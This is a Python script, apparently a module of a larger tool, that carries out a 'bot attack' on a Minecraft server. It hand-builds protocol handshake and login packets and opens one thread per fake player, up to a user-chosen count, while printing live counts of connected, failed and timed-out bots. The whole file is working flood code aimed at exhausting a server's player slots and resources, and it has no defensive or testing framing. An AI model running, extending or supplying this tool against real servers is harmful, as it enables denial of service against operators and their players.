import socket
import threading
import struct
import sys
import time
from colorama import Fore, init

init(autoreset=True)

print_lock = threading.Lock()
counters_lock = threading.Lock()

bots_connected = 0
bots_failed = 0
bots_timeout = 0
max_bots_connected = 0 

def pack_varint(value):
    out = b''
    while True:
        temp = value & 0b01111111
        value >>= 7
        if value != 0:
            temp |= 0b10000000
        out += struct.pack('B', temp)
        if value == 0:
            break
    return out

def encode_string(s):
    b = s.encode('utf-8')
    return pack_varint(len(b)) + b

def send_handshake(sock, host, port):
    packet_id = 0x00
    protocol_version = 340  
    next_state = 2  

    data = b''
    data += pack_varint(protocol_version)
    data += encode_string(host)
    data += struct.pack('>H', port)
    data += pack_varint(next_state)

    packet = pack_varint(len(data) + 1) + struct.pack('B', packet_id) + data
    sock.sendall(packet)

def send_login_start(sock, username):
    packet_id = 0x00
    data = encode_string(username)
    packet = pack_varint(len(data) + 1) + struct.pack('B', packet_id) + data
    sock.sendall(packet)

def print_status(total):
    with print_lock:
        status_line = (f"Bots ON: {bots_connected}/{total} | "
                       f"Bots Failed: {bots_failed}/{total} | "
                       f"Bots Timeout: {bots_timeout}/{total}")
        print("\r" + status_line + " " * 10, end='', flush=True)

def bot_thread(host, port, bot_name, total):
    global bots_connected, bots_failed, bots_timeout, max_bots_connected
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, port))

        send_handshake(sock, host, port)
        send_login_start(sock, bot_name)

        with counters_lock:
            bots_connected += 1
            if bots_connected > max_bots_connected:
                max_bots_connected = bots_connected
        print_status(total)

        try:
            while True:
                data = sock.recv(1024)
                if not data:
                    break
        except socket.timeout:
            with counters_lock:
                bots_timeout += 1
        except Exception as e:
            with counters_lock:
                bots_failed += 1
            with print_lock:
                print(f"\n{Fore.RED}[!] Exception in recv: {e}")

        sock.close()

        with counters_lock:
            bots_connected -= 1
        print_status(total)

    except Exception as e:
        with counters_lock:
            bots_failed += 1
        with print_lock:
            print(f"\n{Fore.RED}[!] Bot {bot_name} error: {e}")
        print_status(total)

def run(args):
    global bots_connected, bots_failed, bots_timeout, max_bots_connected
    if len(args) < 4:
        print(Fore.LIGHTRED_EX + "Usage: botattack <host> <port> <amount> <base_name>")
        return

    host = args[0]
    try:
        port = int(args[1])
        amount = int(args[2])
    except ValueError:
        print(Fore.LIGHTRED_EX + "[!] Port and amount must be integers.")
        return

    base_name = args[3]

    bots_connected = 0
    bots_failed = 0
    bots_timeout = 0
    max_bots_connected = 0

    print(Fore.CYAN + f"Starting bot attack: {amount} bots connecting to {host}:{port} with base name '{base_name}'...")

    threads = []
    start_time = time.time()

    for i in range(1, amount + 1):
        bot_name = f"{base_name}{i}"
        t = threading.Thread(target=bot_thread, args=(host, port, bot_name, amount))
        t.start()
        threads.append(t)

    while True:
        print_status(amount)
        time.sleep(0.3)

        with counters_lock:
            on = bots_connected

        if on == 0 and all(not t.is_alive() for t in threads):
            break

    duration = time.time() - start_time
    print()  
    print(Fore.CYAN + f"Bot attack finished.")
    print(Fore.CYAN + f"Max bots connected simultaneously: {max_bots_connected}/{amount}")
    print(Fore.CYAN + f"Total duration: {duration:.2f} seconds")
